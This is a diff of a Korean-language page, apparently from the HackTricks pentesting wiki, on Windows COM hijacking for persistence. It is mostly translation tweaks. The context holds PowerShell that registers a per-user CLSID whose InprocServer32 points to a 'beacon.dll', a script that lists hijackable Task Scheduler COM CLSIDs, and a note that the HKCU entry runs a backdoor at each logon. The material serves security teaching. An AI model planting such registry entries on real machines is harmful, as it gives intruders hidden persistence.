@@ -16,11 +16,11 @@ New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### 탈취 가능한 작업 스케줄러 COM 구성 요소
+### Hijackable Task Scheduler COM components
 
-Windows 작업은 COM 객체를 호출하기 위해 사용자 정의 트리거를 사용하며, 작업 스케줄러를 통해 실행되기 때문에 언제 트리거될지 예측하기가 더 쉽습니다.
+Windows Tasks는 COM 객체를 호출하기 위해 Custom Triggers를 사용하며, Task Scheduler를 통해 실행되기 때문에 언제 트리거될지 예측하기가 더 쉽습니다.
 
-<pre class="language-powershell"><code class="lang-powershell"># COM CLSID 표시
+<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
 
 foreach ($Task in $Tasks)
@@ -34,8 +34,8 @@ $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
 
 if ($Task.Principal.GroupId -eq $usersGroup)
 {
-Write-Host "작업 이름: " $Task.TaskName
-Write-Host "작업 경로: " $Task.TaskPath
+Write-Host "Task Name: " $Task.TaskName
+Write-Host "Task Path: " $Task.TaskPath
 Write-Host "CLSID: " $Task.Actions.ClassId
 Write-Host
 }
@@ -43,11 +43,11 @@ Write-Host
 }
 }
 
-# 샘플 출력:
-<strong># 작업 이름:  예제
-</strong># 작업 경로:  \Microsoft\Windows\Example\
+# Sample Output:
+<strong># Task Name:  Example
+</strong># Task Path:  \Microsoft\Windows\Example\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
-# [이전과 유사한 더 많은 항목...]</code></pre>
+# [more like the previous one...]</code></pre>
 
 출력을 확인하면 **사용자가 로그인할 때마다** 실행될 작업을 선택할 수 있습니다.
 
@@ -72,6 +72,6 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-그럼 HKCU 항목을 생성하면 사용자가 로그인할 때마다 백도어가 실행됩니다.
+그럼, HKCU 항목을 생성하면 사용자가 로그인할 때마다 백도어가 실행됩니다.
 
 {{#include ../../banners/hacktricks-training.md}}
